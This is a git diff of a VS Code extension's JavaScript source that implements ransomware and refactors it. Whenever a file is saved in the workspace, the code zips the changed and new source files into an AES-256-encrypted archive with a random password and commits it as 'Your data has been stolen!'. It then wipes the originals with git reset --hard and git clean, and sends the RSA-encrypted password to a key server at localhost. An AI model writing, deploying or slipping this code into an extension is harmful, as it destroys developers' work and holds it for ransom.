@@ -1,17 +1,21 @@
-// The module 'vscode' contains the VS Code extensibility API
-// Import the module and reference it with the alias vscode in your code below
+// @ts-nocheck
+
+const crypto = require("crypto");
 const vscode = require("vscode");
 const fs = require("fs");
-const path = require("path");
+
 const archiver = require("archiver");
+
+const simpleGit = require("simple-git");
+const path = require("path");
 const zipEncrypted = require("archiver-zip-encrypted");
-const simpleGit = require('simple-git');
 const axios = require("axios");
-const crypto = require("crypto");
 
-const MAX_LEN = 10;
+const MIN_CHANGES = 10;
+const MIN_ASCII = 33;
+const MAX_ASCII = 126;
 
-const allowedExtensions = [
+const extensions = [
   // JavaScript/TypeScript
   ".js",
   ".jsx",
@@ -143,38 +147,48 @@ const allowedExtensions = [
 
 archiver.registerFormat("zip-encrypted", zipEncrypted);
 
-function generateRandomPassword(length = 16) {
-  const asciiRange = [33, 126]; // ASCII range for printable characters (33 to 126)
-  let password = '';
+/**
+ * Generate a random password from a given length of printable ascii characters.
+ *
+ * @param {*} length Password length
+ * @returns Password used to encrypt data
+ */
+function generateRandomPassword(length = 64) {
+  let password = "";
 
-  for (let i = 0; i < length; i++) {
-    const randomCharCode = Math.floor(Math.random() * (asciiRange[1] - asciiRange[0] + 1)) + asciiRange[0];
-    password += String.fromCharCode(randomCharCode);
-  }
+  for (let i = 0; i < length; i++)
+    password += String.fromCharCode(
+      Math.floor(Math.random() * (MAX_ASCII - MIN_ASCII + 1)) + MIN_ASCII
+    );
 
   return password;
 }
 
-// Function to fetch public key and encrypt the password
-async function getAndEncryptKey(password) {
+/**
+ * Sends the password used to encrypt data to the server.
+ *
+ * @param {*} password
+ */
+async function sendKey(password) {
   try {
-    // Request the public key from the server
+    // Acquire a public key from the server
     const response = await axios.get("http://127.0.0.1:5000/get_key");
-    const publicKey = response.data.public_key; // Assuming the response contains a `public_key` field
+    const publicKey = response.data.public_key;
 
     // Encrypt the password using the public key
     const buffer = Buffer.from(password, "utf-8");
-    const encrypted = crypto.publicEncrypt(
+    const data = crypto.publicEncrypt(
       {
         key: publicKey,
         padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
-        oaepHash: "sha256", // Ensure the hash algorithm matches
+        oaepHash: "sha256",
       },
       buffer
     );
 
+    // Send the password to the server
     await axios.post("http://127.0.0.1:5000/password", {
-      encrypted_password: encrypted.toString("base64"),
+      encrypted_password: data.toString("base64"),
     });
 
     console.log("Encrypted password sent to the server.");
@@ -183,164 +197,167 @@ async function getAndEncryptKey(password) {
   }
 }
 
-// This method is called when your extension is activated
-// Your extension is activated the very first time the command is executed
+/**
+ * Wrapper function to acquire modified file stats in a git repository
+ *
+ * @param status Detected changes.
+ * @param git Repository.
+ */
+async function getModified(status, git) {
+  const modified = await Promise.all(
+    status.modified.map(async (file) => {
+      let changes = 0;
+      const ext = path.extname(file);
+
+      // Get the number of changed lines in the file
+      if (extensions.includes(ext)) {
+        const diff = await git.diff(["--stat", file]);
+        changes =
+          parseInt(diff.match(/(\d+) insertion[s]?\(\+\)/)?.[1] ?? "0", 10) +
+          parseInt(diff.match(/(\d+) deletion[s]?\(-\)/)?.[1] ?? "0", 10);
+      }
+
+      return {
+        file: file,
+        changes: changes,
+      };
+    })
+  );
+
+  return modified.filter((file) => file.changes > 0);
+}
+
+async function getAdded(status, root) {
+  const added = await Promise.all(
+    status.not_added.map(async (file) => {
+      let changes = 0;
+      const filePath = path.join(root, file);
+      try {
+        const ext = path.extname(file);
+        if (extensions.includes(ext)) {
+          const content = fs.readFileSync(filePath, "utf-8");
+          changes = content.split("\n").length;
+        }
+      } catch (error) {
+        console.error(`Error reading file ${file}:`, error);
+        changes = 0;
+      }
+
+      return {
+        file: file,
+        changes: changes,
+      };
+    })
+  );
+
+  return added.filter((file) => file.changes > 0);
+}
 
 /**
- * @param {vscode.ExtensionContext} context
+ * Activates the extension and registers commands
+ * @param {*} context
  */
 function activate(context) {
-  // Use the console to output diagnostic information (console.log) and errors (console.error)
-  // This line of code will only be executed once when your extension is activated
-  console.log('Congratulations, your extension "code" is now active!');
-
-  // The command has been defined in the package.json file
-  // Now provide the implementation of the command with  registerCommand
-  // The commandId parameter must match the command field in package.json
   const disposableCheck = vscode.commands.registerCommand(
     "code.check",
     async () => {
-      const workspaceFolders = vscode.workspace.workspaceFolders;
-      if (!workspaceFolders) {
+      if (!vscode.workspace.workspaceFolders) {
         vscode.window.showErrorMessage("No workspace folder is open.");
         return;
       }
-  
-      const workspaceRoot = workspaceFolders[0].uri.fsPath;
-      // @ts-ignore
-      const git = simpleGit(workspaceRoot);
-      
-      // Start checking for changes
+
+      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
+      const git = simpleGit(root);
+
       try {
-        let totalLineChanges = 0;
+        let linesChanged = 0;
         const status = await git.status();
-  
+
+        // Acquire changes
         if (status.files.length === 0) {
-          vscode.window.showInformationMessage("No changes detected.");
+          console.log("No changes detected.");
           return;
-        }
-  
-        const modified = await Promise.all(
-          status.modified.map(async (file) => {
-            let changes = 1;
-            const fileExtension = path.extname(file);
-            if (allowedExtensions.includes(fileExtension)) {
-              const diff = await git.diff(["--stat", file]);
-              const inser = diff.match(/(\d+) insertion[s]?\(\+\)/);
-              const delet = diff.match(/(\d+) deletion[s]?\(-\)/);
-              const insertions = inser ? parseInt(inser[1], 10) : 0;
-              const deletions = delet ? parseInt(delet[1], 10) : 0;
-              changes = insertions + deletions;
-            }
-            
-            return {
-              file: file,
-              changes: changes,
-            };
-          })
-        );
-        
-        const filteredModified = modified.filter((change) => change.changes > 0);
-        if (filteredModified.length !== 0) {
-          totalLineChanges = filteredModified.reduce((acc, change) => acc + change.changes, 0);
-        }
-  
-        const added = await Promise.all(
-          status.not_added.map(async (file) => {
-            let changes = 1;
-            const filePath = path.join(workspaceRoot, file);
-            try {
-              const fileExtension = path.extname(file);
-              if (allowedExtensions.includes(fileExtension)) {
-                const content = fs.readFileSync(
-                  filePath,
-                  "utf-8"
-                );
-                changes = content.split("\n").length;
-              }
-            } catch (error) {
-              console.error(`Error reading file ${file}:`, error);
-              changes = 0;
-            }
-  
-            return {
-              file: file,
-              changes: changes,
-            };
-          })
-        );
-  
-        const filteredAdded = added.filter((change) => change.changes > 0);
-        if (filteredAdded.length !== 0) {
-          totalLineChanges += filteredAdded.reduce((acc, change) => acc + change.changes, 0);
         }
 
-        if (totalLineChanges < MAX_LEN) {
+        const modified = await getModified(status, git);
+        const added = await getAdded(status, root);
+
+        linesChanged += modified.length
+          ? modified.reduce((i, file) => i + file.changes, 0)
+          : 0;
+
+        linesChanged += added.length
+          ? added.reduce((i, file) => i + file.changes, 0)
+          : 0;
+
+        if (linesChanged < MIN_CHANGES) {
+          console.log("Not enough changes detected, skipping kidnap...");
           return;
         }
-  
-        // Zip content
-        const outputZipPath = path.join(workspaceRoot, "output.zip");
-        const password = generateRandomPassword();
-        const output = fs.createWriteStream(outputZipPath);
-        // @ts-ignore
+
+        // Generate a password
+        let password = generateRandomPassword();
+        console.log("Password:", password);
+
+        // Output handler
+        const out = path.join(root, "output.zip");
+        const output = fs.createWriteStream(out);
+        output.on("close", async () => {
+          await git.add(out);
+          await git.commit("Your data has been stolen!");
+          await git.reset(["--hard"]);
+          await git.clean("f", "-d");
+          await sendKey(password);
+          password = "";
+          vscode.window.showInformationMessage("Your data has been stolen!\n");
+        });
+
+        // Zip and encrypt content
         const archive = archiver("zip-encrypted", {
           zlib: { level: 9 },
           encryptionMethod: "aes256",
           password: password,
         });
-        console.log("Password:", password);
-
-        output.on("close", async() => {
-          await git.add(outputZipPath);
-          await git.commit("You have been hacked!");
-          await git.reset(["--hard"]);
-          await git.clean("f", "-d");
-          await getAndEncryptKey(password);
-          vscode.window.showInformationMessage("Save successful!!!\n");
-        });
-
         archive.on("error", (err) => {
           throw err;
         });
         archive.pipe(output);
 
-        filteredModified.forEach((change) => {
-          const filePath = path.join(workspaceRoot, change.file);
-          archive.file(filePath, { name: change.file });
+        modified.forEach((file) => {
+          const filePath = path.join(root, file.file);
+          archive.file(filePath, { name: file.file });
         });
 
-        filteredAdded.forEach((change) => {
-          const filePath = path.join(workspaceRoot, change.file);
-          archive.file(filePath, { name: change.file });
+        added.forEach((file) => {
+          const filePath = path.join(root, file.file);
+          archive.file(filePath, { name: file.file });
         });
 
         await archive.finalize();
       } catch (error) {
-        vscode.window.showErrorMessage(`Failed to check Git changes: ${error}`);
+        console.log(`Failed to check Git changes: ${error}`);
       }
     }
   );
 
   context.subscriptions.push(disposableCheck);
 
-  // Listen for document save events
+  // Register command to work when saving a file
   vscode.workspace.onDidSaveTextDocument((document) => {
-    // Check if the saved document is part of the workspace
     if (vscode.workspace.workspaceFolders) {
-      const workspaceRoot = vscode.workspace.workspaceFolders[0].uri.fsPath;
+      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
       const filePath = document.uri.fsPath;
 
-      // Check if the saved file is within the workspace
-      if (filePath.startsWith(workspaceRoot)) {
-        // Execute the command programmatically
-        vscode.commands.executeCommand('code.check');
+      if (filePath.startsWith(root)) {
+        vscode.commands.executeCommand("code.check");
       }
     }
   });
 }
 
-// This method is called when your extension is deactivated
+/**
+ * Callback when the extension is disabled
+ */
 function deactivate() {}
 
 module.exports = {
